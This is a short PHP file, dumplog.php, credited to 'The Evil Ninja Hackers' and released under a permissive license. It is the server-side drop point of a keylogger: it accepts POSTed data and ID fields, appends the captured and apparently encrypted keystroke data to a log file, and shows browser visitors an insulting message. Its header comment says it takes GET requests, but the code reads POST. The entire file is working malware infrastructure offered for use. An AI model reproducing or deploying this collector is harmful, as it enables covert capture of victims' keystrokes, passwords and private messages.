<?php
///////////////////////////////////////////////////////////////////////////
//Copyright (C) 2013 The Evil Ninja Hackers <ENH@lavabit.com>            //
//                                                                       //
// Permission is hereby granted, free of charge, to any person obtaining //
// a copy of this software and associated documentation files (the       //
// "Software"), to deal in the Software without restriction, including   //
// without limitation the rights to use, copy, modify, merge, publish,   //
// distribute, sublicense, and/or sell copies of the Software, and to    //
// permit persons to whom the Software is furnished to do so, subject to //
// the following conditions:                                             //
//                                                                       //
// The above copyright notice and this permission notice shall be        //
// included in all copies or substantial portions of the Software.       //
//                                                                       //
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,       //
// EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF    //
// MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.//
// IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY  //
// CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,  //
// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE     //
// SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.                //
///////////////////////////////////////////////////////////////////////////
//Note:                                                                  //
//  I love to create free software, and if you are reading this, you     //
//  probably love using free software.  If you enjoyed this software,    //
//  please send me an email saying you liked it.  I love to create free  //
//  software, but what's even better than that is hearing that people    //
//  like the software I create.                                          //
///////////////////////////////////////////////////////////////////////////

//dumplog.php:
//Takes 3 GET requests, and writes encrypted data to the server along with an ID.

$data = $_POST["d"];  //Gets the data
$id = $_POST["i"];  //the id
$nextid = $_POST["ni"];  //And the next id

$logfile = "keyloggerlogfiles.txt";
$fh = fopen($logfile, 'a');  //But appends so nothing will ever be lost.
fwrite($fh, "\n*[ID]" . $id . "*\n" . $data . "\n*[NID]" . $nextid . "*\n");  //Writes the data
fclose($fh);  //And closes the file
echo "Fuck off, n00b.";  //Prints a rude message to anyone who looks at the page in a browser.
?>